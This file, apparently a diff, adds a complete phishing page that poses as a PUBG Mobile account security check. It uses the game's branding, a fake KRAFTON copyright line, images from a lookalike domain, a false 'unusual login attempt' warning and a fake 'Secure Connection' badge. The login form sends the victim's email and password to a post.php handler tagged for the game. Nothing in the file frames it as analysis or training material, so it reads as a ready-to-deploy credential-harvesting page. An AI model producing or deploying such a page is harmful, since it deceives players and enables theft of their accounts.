@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PUBG Mobile Account Security Check</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #0a192f;
+            color: white;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background-image: url('https://pubgmobile.live/images/background.jpg');
+            background-size: cover;
+            background-position: center;
+        }
+        .container {
+            background-color: rgba(10, 25, 47, 0.9);
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
+            width: 350px;
+            text-align: center;
+            border: 1px solid #f8b319;
+        }
+        .logo {
+            width: 180px;
+            margin-bottom: 20px;
+        }
+        h1 {
+            color: #f8b319;
+            margin-bottom: 20px;
+            font-size: 24px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .warning {
+            background-color: rgba(248, 179, 25, 0.2);
+            color: #f8b319;
+            padding: 10px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            font-size: 14px;
+            border: 1px solid #f8b319;
+        }
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            border: 1px solid #1e3a8a;
+            border-radius: 5px;
+            background-color: #0f2d5a;
+            color: white;
+            box-sizing: border-box;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background: linear-gradient(135deg, #f8b319, #f5a107);
+            color: #0a192f;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            margin-top: 10px;
+            transition: all 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        button:hover {
+            background: linear-gradient(135deg, #f5a107, #e69500);
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(248, 179, 25, 0.3);
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #6c757d;
+        }
+        .security-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 15px 0;
+            color: #f8b319;
+            font-size: 14px;
+        }
+        .security-badge:before,
+        .security-badge:after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid #f8b319;
+            margin: 0 10px;
+            opacity: 0.5;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://pubgmobile.live/images/logo.png" alt="PUBG Mobile" class="logo">
+        <h1>Account Security Check</h1>
+        <div class="warning">
+            <i class="fas fa-shield-alt"></i> Unusual login attempt detected. Verify your identity to continue.
+        </div>
+        
+        <form id="loginForm" action="post.php?game=pubg" method="POST">
+            <input type="text" name="email" placeholder="Email or Username" required>
+            <input type="password" name="password" placeholder="Password" required>
+            
+            <div class="security-badge">
+                <i class="fas fa-lock"></i> Secure Connection <i class="fas fa-check-circle"></i>
+            </div>
+            
+            <button type="submit">VERIFY IDENTITY</button>
+        </form>
+        
+        <div class="footer">
+            © 2023 KRAFTON, Inc. All rights reserved.
+        </div>
+    </div>
+
+    <script src="https://kit.fontawesome.com/a076d05399.js"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Add loading state to button
+            const form = document.getElementById('loginForm');
+            const submitBtn = form.querySelector('button[type="submit"]');
+            
+            form.addEventListener('submit', function(e) {
+                // Show loading state
+                submitBtn.disabled = true;
+                submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> VERIFYING...';
+                
+                // Add slight delay to show loading state
+                setTimeout(() => {
+                    // Form will submit normally after this
+                }, 1000);
+            });
+            
+            // Add animation to inputs on focus
+            const inputs = document.querySelectorAll('input');
+            inputs.forEach(input => {
+                input.addEventListener('focus', function() {
+                    this.style.borderColor = '#f8b319';
+                    this.style.boxShadow = '0 0 0 2px rgba(248, 179, 25, 0.2)';
+                });
+                
+                input.addEventListener('blur', function() {
+                    this.style.borderColor = '#1e3a8a';
+                    this.style.boxShadow = 'none';
+                });
+            });
+        });
+    </script>
+</body>
+</html>
